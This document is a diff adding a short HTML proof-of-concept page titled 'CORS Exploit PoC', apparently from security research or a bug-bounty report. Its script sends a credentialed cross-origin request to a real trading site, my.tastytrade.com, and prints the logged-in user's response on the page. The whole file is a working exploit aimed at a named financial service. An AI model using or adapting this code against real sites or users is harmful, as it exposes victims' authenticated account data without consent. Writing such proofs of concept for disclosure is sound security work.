@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>CORS Exploit PoC</h1>
+    <button id="exploit">Exploit</button>
+    <div id="result"></div>
+
+    <script>
+        document.getElementById('exploit').onclick = function() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'https://my.tastytrade.com', true);
+            xhr.withCredentials = true;
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    document.getElementById('result').innerText = xhr.responseText;
+                }
+            };
+            xhr.send();
+        };
+    </script>
+</body>
+</html>
